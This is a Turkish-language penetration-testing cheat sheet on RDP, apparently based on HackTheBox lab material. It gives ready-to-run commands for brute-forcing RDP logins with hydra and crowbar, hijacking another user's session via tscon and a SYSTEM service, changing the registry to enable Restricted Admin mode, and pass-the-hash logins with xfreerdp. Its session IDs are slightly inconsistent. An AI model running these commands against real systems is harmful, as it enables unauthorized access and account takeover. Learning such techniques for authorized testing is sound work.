# remote desktop protokol (`rdp`)


**defult port**: `TCP/3389`

---


## nmap

```bash
nmap -Pn -p3389 192.168.2.143 

PORT     STATE    SERVICE
3389/tcp open ms-wbt-server
```

## Login Brute Force

### Crowbar aracını kullanarak, RDP hizmetine karşı brute force 

```bash
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

### hydra aracını kullanarak, RDP hizmetine karşı brute force 

```bash
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```


##  `rdesktop` veya `xfreerdp`  RDP ile bağlanabiliriz.

###  rdesktop

```bash
rdesktop -u admin -p password123 192.168.2.143
```

###  xfreerdp3

```bash
 xfreerdp3 /v:10.129.203.12:3389 /u:'htbdbuser' /p:'MSSQLAccess01!' /cert:ignore +clipboard
```

## RDP Session Hijacking
**Aşağıdaki örnekte görüldüğü üzere, Yönetici (Administrator) ayrıcalıklarına sahip "juurena" (Kullanıcı Kimliği = `2`) kullanıcısı olarak oturum açmış durumdayız. Amacımız, yine RDP üzerinden oturum açmış olan "lewen" (Kullanıcı Kimliği = `4`) kullanıcısının oturumunu ele geçirmektir.**


![session-hijacl](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/116/rdp_session-1-2.png)


**Bir kullanıcının parolasını bilmeden onun kimliğine bürünebilmek için SYSTEM ayrıcalıklarına sahip olmamız ve kullanıcıların başka bir masaüstü oturumuna bağlanmasını sağlayan Microsoft'a ait `tscon.exe` ikili dosyasını kullanmamız gerekir. Bu yöntem, bağlanmak istediğimiz OTURUM KİMLİĞİNİ (örneğimizdeki '`lewen`' oturumu için `4`) ve hedef oturum adını (mevcut oturumumuz olan `rdp-tcp#13`) belirterek çalışır. Örneğin, aşağıdaki komut, mevcut RDP oturumumuz içerisinde, belirtilen OTURUM KİMLİĞİne (`SESSION_ID`) sahip yeni bir konsol açacaktır:**

```cmd
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

Yerel yönetici ayrıcalıklarına sahipsek, **SYSTEM** ayrıcalıklarını elde etmek için `PsExec` veya `Mimikatz` gibi çeşitli yöntemler kullanabiliriz. 



Basit bir yöntem, varsayılan olarak "Local System" (Yerel Sistem) hesabıyla çalışan ve herhangi bir ikili dosyayı (binary) SYSTEM ayrıcalıklarıyla yürütecek bir Windows hizmeti oluşturmaktır. Bunun için Microsoft'un `sc.exe` aracını kullanacağız. İlk olarak, hizmet adını (`sessionhijack`) ve yürütmek istediğimiz komutu içeren `binpath` değerini belirtiyoruz. Aşağıdaki komutu çalıştırdığımızda, `sessionhijack` adında bir hizmet oluşturulacaktır.

```cmd
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```

![hijack](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/116/rdp_session-2-2.png)

Komutu çalıştırmak için, oturum kaçırma hizmetine başlayabiliriz:


```cmd
C:\htb> net start sessionhijack
```

**success**
![session-hijack-success](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/116/rdp_session-3-2.png)

## RDP Pass-the-Hash (PtH)

Bir sızma testi sırasında, hedef kullanıcının Windows sisteminde yüklü olan ve yalnızca grafik arayüz (GUI) üzerinden erişilebilen uygulama veya yazılımlara ulaşmamız gerekebilir. Eğer hedef kullanıcıya ait açık metin (plaintext) kimlik bilgileri elimizdeyse, sisteme RDP ile bağlanmak oldukça kolaydır. Peki ya elimizde yalnızca, SAM veritabanı gibi kaynaklardan gerçekleştirilen bir "kimlik bilgisi dökümü" (credential dumping) saldırısı sonucu elde edilmiş bir NT hash değeri varsa ve bu hash değerini kırarak orijinal parolayı açığa çıkaramadıysak ne olacak? İşte böyle durumlarda, `xfreerdp` gibi araçları kullanarak bir RDP Pass-the-Hash (PtH) saldırısı gerçekleştirebilir ve hedef sisteme grafik arayüz (GUI) üzerinden erişim sağlayabiliriz.


**Bu saldırıyla ilgili birkaç önemli nokta bulunmaktadır:**

+ Varsayılan olarak devre dışı olan "Kısıtlı Yönetici Modu"nun (Restricted Admin Mode), hedef ana bilgisayarda etkinleştirilmiş olması gerekir; aksi takdirde aşağıdaki hata iletisiyle karşılaşırız:

![XFREE](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/116/rdp_session-4.png)

Bu, `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` altında DisableRestrictedAdmin (REG_DWORD) adında yeni bir kayıt defteri anahtarı eklenerek etkinleştirilebilir. Bu işlem, aşağıdaki komut kullanılarak gerçekleştirilebilir:

**DisableRestrictedAdmin Kayıt Defteri Anahtarının Eklenmesi**

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/116/rdp_session-5.png)


Kayıt defteri anahtarı eklendikten sonra, `RDP` erişimi sağlamak için /`pth` seçeneğiyle birlikte `xfreerdp` kullanabiliriz:


```bash
xfreerdp /v:192.168.220.152 /u:lewen pth:300FF5E89EF33F83A8146C10F5AB9BB9
```
